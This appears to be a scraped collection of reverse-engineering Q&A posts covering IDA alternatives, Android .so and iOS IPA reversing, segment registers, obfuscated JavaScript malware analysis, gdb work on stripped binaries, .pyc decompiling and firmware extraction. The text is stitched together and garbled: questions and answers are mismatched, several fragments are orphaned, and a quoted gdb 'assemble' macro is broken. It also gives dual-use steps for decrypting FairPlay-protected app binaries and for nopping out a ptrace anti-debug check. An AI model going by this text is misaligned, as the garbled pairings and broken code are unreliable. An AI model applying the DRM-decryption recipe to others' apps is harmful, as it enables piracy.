"Is there any disassembler to rival IDA Pro?","224161","","<p>Is there any disassembler (not only a live debugger) second to IDA in capabilities? IDA is wonderful, and somewhat amazing in how robust and useful it is for reversing. However, it is quite expensive to properly license.

<p>I don't expect an alternative to be as good as IDA, just looking for other options that may be more affordable, and useful <em>enough</em>.</p>

<p>How can I figure out the source for an audio\video embedded file on a webpage? 
Where do I start?</p>
","<p>When you create a website and you embed images, videos, audio, javascript or other external sources, you specify their location by an own URL too. </p>

<p>For example you have this directory structure on your server, which resolves to the following accessible URLs (asuming your website is www.example.com):</p>

<pre><code>|-- /index.html                -&gt;  www.example.com/index.html

<p>When you access <code>index.html</code> your browser will look for all the other embedded URLs and will get them from the server too. You can use tools like <em>Firebug for Firefox</em> or the <em>Chrome Developer Console</em> to capture the requests. One of those requests should be the URL to the media file.</p>

<p>If you have an HTML <code>&lt;embed&gt;</code> tag (or a <code>&lt;img&gt;</code> tag), the URL to that media is specified by the <code>src</code> attribute, which can be also examined with tools like Firebug or the Chrome Developer Console.

"How do I reverse engineer .so files found in android APKs?","110808","","<p>I know how to reverse engineer normal android APKs using tools like APK-tool anddex2jar but i don't know how to work with obfuscation. Can anyone help or atleast provide some pointers? I know this largely constitues learning by myself but I really don't know what to look or where to look. Some examples would be really helpful. Thanks!</p>

<p><strong>Edit:</strong></p>

<p>When I extract everything from APK, I get some SMALI files (I tried JD-GUI but the strings contained random names. Probably obfuscated using Proguard.), some resource files and a "".so"" files in the lib directory. How do I analyze the "".so"" file. I know that SO files are, kind of DLLs of the Linux world but what are the tools that can be used to analyze SO files. Any links to videos would be very helpful. :)</p>

<p>Also, how would I get around if there were a JAR file instead of SO file in the APK?</p>
","<p>The .so file is a compiled library, in most cases from C or C++ source code. .so stands for Shared Object, it doesn't have anything to do with obfusation, it just means someone wrote parts of the app in C.</p>

<p>In some cases, there is existing C code and it's just easier for the programmer to build a JNI interface to call the library from java; in other cases, the programmer wants the speed advantage that compiled C has over java. And of course, if i want to hide how some part of my application works, writing that in C and compiling it to a .so makes it much harder to reverse.</p>

<p>If you want to reverse an android .so, these are the options you have:</p>

<ul>
<li>Buy the commercial version of IDA pro. The demo versions will not do, as they can't disassemble ARM code. This is expensive, but by far the best tool to work with unknown object code.</li>
<li>If the app includes versions of the .so for different hardware, and if it has a library for android on x86, you can use the free IDA 5.1 version to disassemble it.</li>
<li>If you have access to a linux system, get a gcc toolchain for ARM that includes objdump, and use objdump --disassemble to get a huge text file containing disassembled code. Then, have fun with that text file. There might be gcc toolchains for ARM targets that run on windows as well, but i never tried.</li>
<li>You could also upload the .so file to <a href=""http://onlinedisassembler.com/"">http://onlinedisassembler.com/</a> to get a disassembled file, if you don't want to install a gcc toolchain.</li>
</ul>

<p>Beware, though, in all of these cases, you need a thorough understanding of the ARM processor architecture, assembler language, JNI conventions, and compiler ABI to make any sense of the disassembly. Prepare for many long nights if you're unexperienced.</p>

"Possibilities for reverse engineering an ipa file to its source","81058","","<p>I browsed a lot, but can't find any resources for reverse engineering an ipa file (iPhone application). Is there any method to reverse engineer an ipa file to its source? I've tried to rename it to zip and open it via Winrar/Winzip to view its source, but it doesn't seem helpful.</p>

<p>What are the possibilities to decompile/reverse engineer an ipa file to its source code?</p>
","<p>If the IPA file is straight from iTunes/iPhone (without any modification), the code section in the binary (as indicated by the Info.plist) is encrypted with FairPlay (Apple's proprietary DRM). If you are unsure, you can check whether the cryptid bit is set with otool (see <a href=""https://stackoverflow.com/questions/7038143/executable-encryption-check-anti-piracy-measure"">this page</a>).</p>

<pre><code>otool -arch armv7 -l thebinary | grep crypt
</code></pre>

<p>(where thebinary is the executable binary - see the app's Info.plist, CFBundleExecutable key)</p>

<p><strong>Pre Decryption:</strong></p>

<p>if cryptid is 0, you can proceed on to the <em>Post Decryption</em> section. Otherwise, you will need to decrypt the app. The typical method in brief (with a jailbroken iOS device) is to </p>

<ol>
<li>Install otool, gdb and ldid from Cydia</li>
<li>Install the IPA on an <em>authorized</em> device</li>
<li>Run otool on the binary to get information such as the size of the encrypted payload</li>
<li>Launch the app and suspend it immediately</li>
<li>Use gdb to dump the payload (beginning from 0x2000) <code>gdb -p &lt;process id&gt;</code> then <code>dump output.bin 0x2000 0xNNNN</code> where NNNN is the sum of the beginning (0x2000) and the payload size</li>
<li>Create a new file, using the first 0x1000 bytes of the original binary, and appended with the dump file</li>
<li>Use ldid to sign the new binary, and change the cryptid to 0 (so that iOS won't decrypt the decrypted app again)</li>
</ol>

<p>There are many tools of dubious purposes (piracy) which automates the process, however the above is the gist of how the process is done.</p>

<p><strong>Post Decryption:</strong></p>

<p>You can begin reverse engineering the code when you have access to an unencrypted copy of the binary. </p>

<p>One possible tool is IDA Pro (Free version does not support ARM).
It may still be quite messy since much of iOS's code works with objc_sendMsg(). This IDA plugin may help: <a href=""https://github.com/zynamics/objc-helper-plugin-ida"" rel=""nofollow noreferrer"">https://github.com/zynamics/objc-helper-plugin-ida</a></p>

"How are the segment registers (fs, gs, cs, ss, ds, es) used in Linux?","63636","","<p>I try to understand the process of memory segmentation for the i386 and amd64 architectures on Linux. It seems that this is heavily related to the segment registers <code>%fs</code>, <code>%gs</code>, <code>%cs</code>, <code>%ss</code>, <code>%ds</code>, <code>%es</code>. </p>

<p>Can somebody explain how these registers are used, both, in user and kernel-land programs ?</p>
","<p><strong>Kernel perspective:</strong></p>

<p>I will try to answer from the kernel perspective, covering various OS's.</p>

<p><a href=""http://en.wikipedia.org/wiki/Memory_segmentation"" rel=""nofollow noreferrer"">Memory segmentation</a> is the old way of accessing memory regions.
All major operating systems including OSX, Linux, (from version 0.1) and Windows (from NT) are now using <a href=""http://en.wikipedia.org/wiki/Paging"" rel=""nofollow noreferrer"">paging</a> which is a better way (IMHO) of accessing memory.</p>

<p>Intel, has always introduced backward compatibility in its processors (except IA-64, and we saw how it failed...)
So, in its initial state (after reset) the processor starts in a mode called <a href=""http://en.wikipedia.org/wiki/Real_mode"" rel=""nofollow noreferrer"">real mode</a>, in this mode, segmentation is enabled by default to support legacy software.
During the boot process of the operating system, the processor is changed into <a href=""http://en.wikipedia.org/wiki/Protected_mode"" rel=""nofollow noreferrer"">protected mode</a>, and then in enabled paging.</p>

<p>Before paging, the segment registers were used like this</p>

<blockquote>
  <p>In real mode each logical address points directly into physical memory
  location, every logical address consists of two 16 bit parts: The
  segment part of the logical address contains the base address of a
  segment with a granularity of 16 bytes, i.e. a segments may start at
  physical address 0, 16, 32, ..., 220-16. The offset part of the
  logical address contains an offset inside the segment, i.e. the
  physical address can be calculated as physical_address : =
  segment_part × 16 + offset (if the address line A20 is enabled),
  respectively (segment_part × 16 + offset) mod 220 (if A20 is
  off) Every segment has a size of 216 bytes. [Wikipedia]</p>
</blockquote>

<p><strong>Let's see some examples (286-386 era) :</strong></p>

<p>The 286 architecture introduced 4 segments: <strong>CS</strong> (code segment) <strong>DS</strong> (data segment) SS (stack segment) <strong>ES</strong> (extra segment)
the 386 architecture introduced two new general segment registers <strong>FS</strong>, <strong>GS</strong>.</p>

<p>typical assembly opcode (in Intel syntax) would look like:</p>

<pre><code>mov dx, 850h
mov es, dx     ; Move 850h to es segment register
mov es:cx, 15h ; Move 15 to es:cx
</code></pre>

<p>Using paging (protected mode) the segment registers weren't used anymore for addressing memory locations.</p>

<blockquote>
  <p>In protected mode the segment_part is replaced by a 16 bit selector,
  the 13 upper bits (bit 3 to bit 15) of the selector contains the index
  of an entry inside a descriptor table. The next bit (bit 2) specifies
  if the operation is used with the GDT or the LDT. The lowest two bits
  (bit 1 and bit 0) of the selector are combined to define the privilege
  of the request; where a value of 0 has the highest priority and value
  of 3 is the lowest. [wikipedia]</p>
</blockquote>

<p>The segments however still used to enforce hardware security in the GDT</p>

<blockquote>
  <p>The Global Descriptor Table or GDT is a data structure used by Intel
  x86-family processors starting with the 80286 in order to define the
  characteristics of the various memory areas used during program
  execution, including the base address, the size and access privileges
  like executability and writability. These memory areas are called
  segments in Intel terminology. [wikipedia]</p>
</blockquote>

<p>So, in practice the segment registers in protected mode are used to store indexes to the GDT.</p>

<p>Several operating systems such as Windows and Linux, use some of the segments for internal usage. for instance Windows x64 uses the <code>GS</code> register to access the TLS (thread local storage) and in Linux it's for accessing cpu specific memory.</p>

<p><strong>User perspective:</strong></p>

<p>From the user perspective, in recent operating system that uses paging, the memory works in so called ""flat mode"".
Every process access its own memory (4GB) in linear fashion, so basically the segment registers are not needed.</p>

<p>They are still registers, so they can of course be used for various other assembly operations.</p>

"How to know in which language/technology program (.exe) is written?","62022","","<p>How to understand if exe/dll is written in C++/.Net/Java or in any other language. I tried to use Dependency walker but not able to get required information.</p>
","<p>(reposting <a href=""https://stackoverflow.com/a/18722413/422797"">my SO answer</a> to a similar question)</p>

<p>In many cases it is possible to identify the compiler used to compile the code, and from that, the original language.</p>

<p>Most language implementations include some kind of runtime library to implement various high-level operations of the language. For example, C has the CRT which implements file I/O operations (<code>fopen</code>, <code>fread</code> etc.), Delphi has compiler helpers for its <code>string</code> type (concatenation, assignment and others), ADA has various low-level functions to ensure language safety and so on. By comparing the code of the program and the runtime libraries of the candidate compilers you may be able to find a match.</p>

<p>IDA implements this approach in the <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"" rel=""nofollow noreferrer"">FLIRT technology</a>. By using the signatures, IDA is able to determine most of the major compilers for DOS and Windows. It's somewhat more difficult on Linux because there's no single provider of compiler binaries for it, so signatures would have to be made for every distro.</p>

<p>However, even without resorting to the runtime library code, it may be possible to identify the compiler used. Many compilers use very distinct idioms to represent various operations. For example, I <a href=""http://www.reddit.com/r/programming/comments/qnyy9/duqu_trojan_written_in_mystery_programming/c3z8qhg"" rel=""nofollow noreferrer"">was able to guess</a> that the compiler used for the Duqu virus was Visual C++, which was later <a href=""http://www.wired.com/threatlevel/2012/03/duqu-mystery-language-solved/"" rel=""nofollow noreferrer"">confirmed</a>.</p>

"Analyzing highly obfuscated JavaScript","48582","","<p>I was recently analyzing a web page that contained some highly obfuscated JavaScript - it's clear that the author had went through quite a bit of effort to make it as hard to understand as possible. I've seen several variations on this code - there are enough similarities that it's clear that they have the same source, but different enough that the solution to deobfuscate changes each time.</p>

<p>I started with running the URL through <a href=""https://www.virustotal.com/en/"">VirusTotal</a>, which scored 0/46 - so it was something of interest and not being detected by Anti-Virus software (at least statically). Next I tried running it through <a href=""http://jsunpack.jeek.org/?"">jsunpack</a> to see if it could make any sense of it - no luck, it broke the parser.</p>

<p>Looking at the code, there were a few methods that were designed to be confusing, and then several KB of strings like this that would eventually be decoded as javascript and executed:</p>

<pre><code>22="";4kqkk;255ie;35bnh;4mehn;2lh3b;7i29n;6m2jb;7jhln;562ik...""
</code></pre>

<p>After digging around for a few minutes I was able to determine that the bit of code I really carded about was this:</p>

<pre><code>try{document.body--}catch(dgsdg){e(a);}
</code></pre>

<p>In this case <code>e</code> had been aliased to <code>eval</code> and <code>a</code> was a string that had been manipulated by the various functions at the beginning of the file (and passed around via a series of misleading assignments).</p>

<p>To quickly get the value of <code>a</code> I modified the code to Base64 encode it and output the value, and then opened the HTML file in Chrome on a VM (disconnected from the network):</p>

<pre><code>document.write(window.btoa(a))
</code></pre>

<p>This was able to get me the value I was looking for, but the process took too long - and if I had missed another <code>eval</code> it's possible that I could have executed what was clearly malicious code. So I was able to get what I needed and identify the malware that it was trying to drop - but the process was too slow and risky.</p>

<p>Are there better ways to run javascript like this in a secure sandbox to minimize the risks that go with executing it? I don't see any way a tool could be built to generically deobfuscate this kind of code, so I don't see any way around running it (or building one-off tools, which is also time consuming).</p>

<p>I'd be interesting in hearing about other tools and techniques for dealing with this kind of code.</p>
","<p>It might be worth submitting the JS sample to Wepawet, an online sandbox for web malware analysis.  It is run by UCSB and generally has excellent unpacking/analysis/reporting capabilities.</p>

"How to handle stripped binaries with GDB? No source, no symbols and GDB only shows addresses?","41894","","<p>I have GDB but the binary I want reverse engineer dynamically has no symbols, that is when I run the <code>file</code> utility it shows me <strong>stripped</strong>:</p>

<pre><code>ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, stripped
</code></pre>

<p>What options do I have if the environment in which this runs doesn't allow a remote IDA Pro instance to connect to <code>gdbserver</code>? In short: the environment you have is limited in what it allows you to do, but you do have trusty old <code>gdb</code> and a binary to reverse engineer.</p>
","<h1>Conventions used plus preliminary remarks</h1>

<p>I am trimming the output of GDB for brevity since it usually shows the copyright and other information at the beginning of ever session. When I reproduce the output I'll start at the first <code>(gdb)</code> prompt line, or in case or auto-executed commands from the first genuine output line.</p>

<p>In order to distinguish commands entered at the GDB prompt, these will have a leading <code>(gdb)</code> just like in the real world. For shell command this will either be no prefix at all or <code>$</code> as it appears to be the convention on most unixoid systems.</p>

<p>When I use a particular command, such as <code>vim</code> as my editor, you are free to use your own favorite editor of course. Be it <a href=""http://xkcd.com/378/"" rel=""noreferrer""><code>emacs</code></a> or <code>nano</code>, I won't judge ya ;)</p>

<h1>Getting started</h1>

<p>This section is about setting up your <code>gdb</code> environment and starting the process. I'll also include a few tidbits for the complete newcomers.</p>

<h2>Tricks you should know</h2>

<p>GDB has a nice prompt at which your cursor will stop after the program breaks or whenever you are stepping or some such.</p>

<ul>
<li>Pressing <kbd>RETURN</kbd> (aka <kbd>ENTER</kbd>) after you ran a GDB command will run the same command again. This is useful when you are stepping through code with <code>step</code> or <code>next</code> and simply want to continue one by one.</li>
<li>Commands can be abbreviated as long as they are unambiguous. For some oft used commands a particular shorthand exists that takes precedence despite ambiguity:

<ul>
<li><code>b</code> for <code>break</code> (despite <code>bt</code> and <code>backtrace</code>)</li>
<li><code>c</code> or <code>cont</code> for <code>continue</code> (despite <code>catch</code>, <code>call</code> and so on)</li>
<li><code>n</code> for <code>next</code> (despite <code>ni</code> and <code>nexti</code>)</li>
</ul></li>
<li>You can call actual library functions or even functions from within the debugged program using the command <code>call</code>. This means you can try out behavior or force behavior.</li>
<li>You can start GDB with <code>gdbtui</code> or <code>gdb -tui</code> to get a - supposedly more convenient - more visual text user interface. It shows the source code at the top and the <code>(gdb)</code> prompt below. You can also switch to this layout by executing the command <code>layout src</code> at the <code>(gdb)</code> prompt.</li>
<li>GDB has a command line completion feature much like many shells, so use <kbd>Tab</kbd> to your advantage and also make sure to use <code>help</code> or <code>help [keyword|command]</code> whenever you are in need of help.</li>
<li><code>shell</code> allows you to execute commands in the shell, so that you can run commands from within your GDB session. During development an example would be <code>shell make</code>.</li>
<li><code>print</code>, <code>examine</code> and <code>display</code> know various formats (<code>/FMT</code>) which you can use to make the output more readable.</li>
<li>When source-level debugging you can use C type casts to display values. Imagine a C string behind a <code>void *</code> (which GDB knows thanks to the symbols in such case). Simply cast to <code>(char*)</code> and print it: <code>print (char*)variable</code>.</li>
</ul>

<h2>Getting the process to run</h2>

<p>Since we want to dynamically analyze the binary, we need to start it first.</p>

<h3>Command line</h3>

<p>We can do that straight from the command line by passing not only the path to the binary, but also the arguments we want to start it with. The whole process then looks like this:</p>

<pre><code>$ gdb --args ./exe argument1 argument2
</code></pre>

<p>Easy enough. From the <code>(gdb)</code> prompt you can then issue the <code>run</code> command (shorthand <code>r</code>) to run <code>./exe</code> with the parameters given on the command line. I prefer this method, but your mileage may vary.</p>

<p><img src=""https://i.stack.imgur.com/1IOfY.png"" alt=""Starting a process using the described method""></p>

<h3>GDB prompt</h3>

<p>Fire up GDB and at the <code>(gdb)</code> prompt use the <code>file</code> command to load the binary and then use the <code>run</code> command to start it with the arguments you want to pass:</p>

<pre><code>$ gdb
(gdb) file exe
(gdb) run argument1 argument2
</code></pre>

<p>an alternative to the above would be the use of <code>set args</code> like this:</p>

<pre><code>$ gdb
(gdb) file exe
(gdb) set args argument1 argument2
(gdb) run
</code></pre>

<p><img src=""https://i.stack.imgur.com/GVG6G.png"" alt=""Starting a process using the described method""></p>

<p>You can also see in any case which arguments <code>run</code> would pass to the started process by issuing a:</p>

<pre><code>(gdb) show args
</code></pre>

<p>btw: if you were wondering about environment variables, use GDB's built-in <code>help</code> command as <code>help set</code> and <code>help show</code>. Pointers: <code>set environment VARNAME=VALUE</code> and <code>show environment [VARNAME]</code> and <code>unset environment VARNAME</code>.</p>

<h2>Phew, but why does the program stop with a <code>SIGSEGV</code> (segment fault)?</h2>

<p>Well, we don't know yet, but it looks like this little beasty wants <strong>the proper treatment</strong>. Since we practice defensive computing, we don't want to run anything we don't know much about, right? So let's start over. If this would have been malware we'd have to flush the machine and reinstall or restore a snapshot if it's a VM guest.</p>

<p>First we'll want to run the <code>info</code> command as follows:</p>

<pre><code>(gdb) info file
</code></pre>

<p>Observe:</p>

<p><img src=""https://i.stack.imgur.com/4VTkn.png"" alt=""info file command in GDB""></p>

<p>There are two important pieces of information, the most relevant for us being the line stating:</p>

<pre><code>Entry point: 0x400710
</code></pre>

<p>alright, so we can set a break point on that one and then <code>run</code> the process with the arguments we fancy.</p>

<h2><code>.gdbinit</code> for the win</h2>

<p>But wait, this is getting tedious already. No easy method to automate these steps in some way? As a matter of fact there is. A file named <code>.gdbinit</code> can be used to issue commands to GDB upon startup. You can also pass a file with GDB commands using the <code>-x</code> argument on the (shell) command line. If I have a number of projects, usually they are in subfolders with a <code>.gdbinit</code> file each.</p>

<p><strong>Side-note:</strong> <code>-nx</code> prevents the <code>.gdbinit</code> contents from being executed upon startup.</p>

<p>So we know which arguments we want to pass and we know the address of the break point, this translates to the following <code>.gdbinit</code> file:</p>

<pre><code>file exe
break *0x400710
run argument1 argument2
</code></pre>

<p>The output I get when I start <code>gdb</code> without any other arguments is:</p>

<pre><code>Breakpoint 1 at 0x400710

Breakpoint 1, 0x0000000000400710 in ?? ()
(gdb) 
</code></pre>

<p>Nice! But this looks different ...</p>

<h1>Assembly and GDB</h1>

<p>So you're used to see the next line you're going to execute and then your trusty old <code>(gdb)</code> prompt. But no such thing. We have no source for this binary and furthermore symbols. Doh! So we contemplate the blinking caret at the <code>(gdb)</code> prompt and wonder what to do. Don't fret, GDB can also handle assembly code. Only problem, it defaults to the - in my opinion - inconvenient AT&amp;T assembly syntax. I prefer the Intel flavor and the following command tells GDB to do just that:</p>

<pre><code>(gdb) set disassembly-flavor intel
</code></pre>

<h2>Showings the assembly code</h2>

<p>And how is it going to show us the assembly code? Well, similar to the TUI mode (check the tag wiki for <a href=""/questions/tagged/gdb"" class=""post-tag"" title=""show questions tagged &#39;gdb&#39;"" rel=""tag"">gdb</a>) by using the following command:</p>

<pre><code>(gdb) layout asm
</code></pre>

<p>and if you are so inclined, also:</p>

<pre><code>(gdb) layout regs
</code></pre>

<p>which will also show you the contents of the registers in an overview.</p>

<h2>Let's run it again</h2>

<p>So we end up with the following <code>.gdbinit</code> for our purposes:</p>

<pre><code>file exe
break *0x400710
set disassembly-flavor intel
layout asm
layout regs
run argument1 argument2
</code></pre>

<p>And when we start <code>gdb</code> without arguments we end up with this:</p>

<p><img src=""https://i.stack.imgur.com/nrirU.png"" alt=""GDB with asm and regs layout""></p>

<p>Sweet. So we can see the disassembly while we step through the code. We could conclude this here, but of course there are more tricks to be learned, so why not go a little further.</p>

<p><strong>NOTE:</strong> the registers with white/gray background show that a value has changed. Not too meaningful when we just started the program, but mighty useful when stepping through code later on.</p>

<h3>btw, if you prefer to save screen estate</h3>

<p>... and have it less visual, starting with GDB 7.0 you can use:</p>

<pre><code>set disassemble-next-line on
</code></pre>

<p>on GDB versions before that you can emulate the behavior by settings an <a href=""http://sourceware.org/gdb/current/onlinedocs/gdb/Auto-Display.html#Auto-Display"" rel=""noreferrer"">automatic <code>display</code></a>:</p>

<pre><code>display/i $pc
</code></pre>

<p>or shorter <code>disp/i $pc</code> where <code>/i</code> is the format, you can remember it best by thinking ""instruction"" and <code>$pc</code> being the instruction pointer, also known as program counter - hence <code>pc</code>.</p>

<h3>Also good to know</h3>

<p>Sometimes when stepping through assembly the <code>regs</code> and <code>asm</code> views will get borked. Simply execute the respective <code>layout</code> commands again to restore them to their old glory:</p>

<pre><code>(gdb) layout asm
(gdb) layout regs
</code></pre>

<h1>""Debugging"" at assembly level</h1>

<p>Turns out when you are in assembly mode some of the commands you are used to from source-level debugging simply won't work. That makes sense, because a single source line means usually a dozen instructions or more. The <code>next</code> and <code>step</code> commands, however, have <a href=""http://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html"" rel=""noreferrer"">instruction-level counterparts</a>:</p>

<ul>
<li><code>nexti</code> (shorthand <code>ni</code> ... anyone else thinking of shrubbery?)</li>
<li><code>stepi</code> (shorthand <code>si</code>)</li>
</ul>

<p>From our disassembly above we know:</p>

<pre><code>0x40072d        mov    rdi,0x40f961
</code></pre>

<p>and for all practical purposes this is the <code>main</code> function. Of course if you were to reverse engineer malware you should be more careful, but in this case it is. So let's add a breakpoint to this address (<code>0x40f961</code>) instead of the entry point:</p>

<pre><code>break *0x40f961
</code></pre>

<p>If we <code>examine</code> (shorthand <code>x</code>) the code at which we are currently, we can see:</p>

<pre><code>(gdb) x/5i $pc
x/5i $pc
=&gt; 0x40f961:    push   rbp
   0x40f962:    mov    rbp,rsp
   0x40f965:    mov    eax,0x0
   0x40f96a:    call   0x40911f
   0x40f96f:    pop    rbp
</code></pre>

<p>Okay, the <code>call</code> is what we want to follow, so let's step inside of it using <code>si</code>. We get to see another <code>call</code> immediately at the instruction pointer when entering the function:</p>

<pre><code>(gdb) x/5i $pc
x/5i $pc
=&gt; 0x40911f:    call   0x400b8c
   0x409124:    push   rbp
   0x409125:    mov    rbp,rsp
   0x409128:    push   r10
   0x40912a:    push   r11
</code></pre>

<p>The <code>call</code> leads us to a function which calls <a href=""http://linux.die.net/man/2/ptrace"" rel=""noreferrer""><code>ptrace(PTRACE_TRACEME, ...)</code></a>, now why would it do that?</p>

<pre><code>0x400bab        call   0x4006b8 &lt;ptrace@plt&gt;
</code></pre>

<p>Well, it's an old anti-debugger trick which Mellowcandle has described in another Q&amp;A here:</p>

<ul>
<li><a href=""https://reverseengineering.stackexchange.com/questions/1930/detecting-tracing-in-linux"">Detecting tracing in Linux</a></li>
</ul>

<p>But how do we get around it? We'd have to overwrite the <code>call</code> to the function which calls <code>ptrace()</code> with <code>nop</code> or something along those lines.</p>

<p>This is where GDB becomes a little unwieldy. But we can use <code>set</code> so do the magic for us. Let's first inspect the instruction bytes:</p>

<pre><code>(gdb) x/10b $pc
x/10b $pc
0x40911f:       0xe8    0x68    0x7a    0xff    0xff    0x55    0x48    0x89
0x409127:       0xe5    0x41
</code></pre>

<p>The <code>0xe8</code> is a call instruction and we know now that it is 5 bytes long. So let's <code>nop</code> this out. (<code>x/10b $pc</code> means examine 10 bytes at program counter - default format is hex already).</p>

<p>So we do while stopped at <code>0x40911f</code>:</p>

<pre><code>(gdb) set write
(gdb) set {unsigned int}$pc = 0x90909090
(gdb) set {unsigned char}($pc+4) = 0x90
(gdb) set write off
</code></pre>

<p>and verify the patched location:</p>

<pre><code>(gdb) x/10i $pc
x/10i $pc
=&gt; 0x40911f:    nop
   0x409120:    nop
   0x409121:    nop
   0x409122:    nop
   0x409123:    nop
   0x409124:    push   rbp
   0x409125:    mov    rbp,rsp
   0x409128:    push   r10
   0x40912a:    push   r11
   0x40912c:    push   rbx
</code></pre>

<p>Excellent. We can now execute it.</p>

<h2>Alternatives to the given method</h2>

<ol>
<li>alternative for patching: <code>set {unsigned int}0x40911f = 0x90909090</code> followed by <code>set {unsigned char}0x409123 = 0x90</code></li>
<li>Manipulate the program counter (instruction pointer) instead:

<ul>
<li><code>set $pc+=5</code> or the more explicit <code>set $pc=$pc+5</code></li>
<li><code>jump *$pc+5</code></li>
</ul></li>
</ol>

<h2>Better ways yet to manipulate/patch the running program</h2>

<p>There are alternative (and way superior) methods like <a href=""http://my.opera.com/taviso/blog/show.dml/248232"" rel=""noreferrer"">this one by Tavis Ormandy</a>. I'm reproducing the <code>assemble</code> macro below (in case it goes offline from the other place):</p>

 if ($argc)
  if (*$arg0 = *$arg0)
    # check if we have a valid address by dereferencing it,

  end
  printf ""Instructions will be written to %#x.\n"", $arg0
 else
  printf ""Instructions will be written to stdout.\n""
 end
 printf ""Type instructions, one per line.\n""
 printf ""End with a line saying just \""end\"".\n""

        '1/1 ""set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n""' \
            &gt; ~/.gdbassemble

  source ~/.gdbassemble
  # all done.
  shell rm -f ~/.gdbassemble

<p>You may notice that <code>readelf</code> detected an entrypoint. In fact, it does correspond to the procedure in charge of initializing the memory to get the library properly loaded. But, it is of no use for us.</p>

<p>Looking at the rest of the output of <code>readelf -a</code>, the dynamic symbol table (<code>.dynsym</code>) is quite informative because it contains entries like this:</p>

"Decompiling .pyc files","34440","","<p>Does anybody have a suggestion for (non commercial) software to decompile ""byte-code"" Python (.pyc) files?</p>

<p>Everything I've found seems to break...</p>
","<p>What Python version you're decompiling? Py3k is not well supported, but there are quite a few decompilers for 2.x. One of the latest projects is this:</p>

<p><a href=""https://github.com/Mysterie/uncompyle2"">https://github.com/Mysterie/uncompyle2</a></p>

<p>It runs on Python 2.7 but supports decompiling 2.5 to 2.7.</p>

<p>Note that some commercial projects has been known to use modified Python interpreters. Modifications can include:</p>

<ul>
<li>bytecode files encryption</li>
<li>changed opcode values or additional opcodes</li>
<li>a heavily customized runtime (e.g. Stackless Python)</li>
</ul>

<p>If you need to handle this, one approach is to convert non-standard bytecode to standard one and then use the usual decompilers (this apparently was used by the people from above project to decompile Dropbox code). Another is to change the decompiler to directly support the variations.</p>

","<p>PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time. </p>

<p>GOT stands for Global Offsets Table and is similarly used to resolve addresses. Both PLT and GOT and other relocation information is explained in greater length in <a href=""http://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html"">this article</a>.</p>

"How do I extract a copy of an unknown firmware from a hardware device?","31682","","<p>Appreciate it's a broad question, but despite days of Googling I haven't found straight forward explanation of the general principle of how to ""capture"" or copy an unkown firmware from a piece of hardware. </p>

<p>I gather once you have it you can begin to use various tools to analyse it, but what I want to understand is how to get it in the first place. </p>

<p>From what i understand you need to connect to it via a JTAG or UART connection , after that I'm a bit lost.</p>
","<p>As you may suspect, it very much depends on the hardware. In general, you are correct, JTAG and/or UARTs can be often be used to get a copy of the firmware (downloading a firmware update from the vendor is usually the easiest way of course, but I'm assuming that is not what you mean). </p>

<p>JTAG implementations typically allow you to read/write memory, and flash chips are typically ""mapped"" into memory at some pre-defined address (finding that address is usually a matter of Googling, experience, and trial and error); thus, you can use tools like <a href=""http://urjtag.org/"" rel=""nofollow noreferrer"">UrJTAG</a> and <a href=""http://openocd.sourceforge.net/"" rel=""nofollow noreferrer"">OpenOCD</a> to read the contents of flash.</p>

<p>UART is just a serial port, so what interface or options it provides (if any) is entirely up to the developer who created the system; most bootloaders (e.g., <a href=""http://www.denx.de/wiki/U-Boot"" rel=""nofollow noreferrer"">U-Boot</a>) do allow you to read/write flash/memory, and will dump the ASCII hex to your terminal window. You then would need to parse the hexdump and convert it into actual binary values. Again, YMMV and there may be no way to dump memory or flash via the UART.</p>

<p>Other devices may have other mechanisms that provide similar functionality; for example, Microchip's PIC microcontrollers use <a href=""http://en.wikipedia.org/wiki/In-circuit_serial_programming"" rel=""nofollow noreferrer"">ICSP</a> (In Circuit Serial Programming) interfaces to read, write, and debug firmware. Such interfaces are usually proprietary, and may or may not be documented (Microchip's is well known).</p>

<p>Vendors may take steps to protect or disable debug interfaces such as JTAG, UART and ICSP, but often you can <a href=""https://reverseengineering.stackexchange.com/questions/2337/how-to-dump-flash-memory-with-spi"">dump the flash chip</a> directly (this is usually faster than JTAG/UART, but may require some de/soldering). For devices such as microcontrollers that have the flash chip built-in (i.e., the flash chip is not exposed to you), you may need to resort to <a href=""http://www.bunniestudios.com/blog/?page_id=40"" rel=""nofollow noreferrer"">more advanced techniques</a> for defeating such copy-protections.</p>

<p>Personally, since I don't deal much with microcontroller based systems, dumping the flash chip directly is usually my go-to for grabbing a copy of the firmware from the device.</p>

<p>Entrypoint is still <code>0x40489c</code>.</p></li>
</ol>

<h2>Locating the <code>main</code> procedure</h2>

<p>Once the entrypoint is known, you can set a breakpoint on it and start looking for the <code>main</code> procedure. Because, you have to know that most of the program will start by a <code>_start</code> procedure in charge of initializing the memory for the process and loading the dynamic libraries. What exactly does this initialization procedure is quite tedious to follow and, most of the time, of no interest at all to understand your program. The <code>main</code> procedure will only start after all the memory is set-up and ready to go. </p>

<p>Lets see how to do that (I assume that the executable has been compile with <code>gcc</code>):</p>

<pre><code>(gdb) break *0x40489c
Breakpoint 1 at 0x40489c
(gdb) run
Starting program: /bin/ls 
warning: Could not load shared library symbols for linux-vdso.so.1.

Breakpoint 1, 0x000000000040489c in ?? ()
</code></pre>

<p>Okay, so we stopped at the very beginning of the executable. At this time, nothing is ready, everything need to be set-up. Let see what are the first steps of the executable:</p>

<pre><code>(gdb) disas 0x40489c,+50
Dump of assembler code from 0x40489c to 0x4048ce:
=&gt; 0x000000000040489c:  xor    %ebp,%ebp
   0x000000000040489e:  mov    %rdx,%r9
   0x00000000004048a1:  pop    %rsi
   0x00000000004048a2:  mov    %rsp,%rdx
   0x00000000004048a5:  and    $0xfffffffffffffff0,%rsp
   0x00000000004048a9:  push   %rax
   0x00000000004048aa:  push   %rsp
   0x00000000004048ab:  mov    $0x411ee0,%r8
   0x00000000004048b2:  mov    $0x411e50,%rcx
   0x00000000004048b9:  mov    $0x4028c0,%rdi
   0x00000000004048c0:  callq  0x4024f0 &lt;__libc_start_main@plt&gt;
   0x00000000004048c5:  hlt    
   0x00000000004048c6:  nopw   %cs:0x0(%rax,%rax,1)
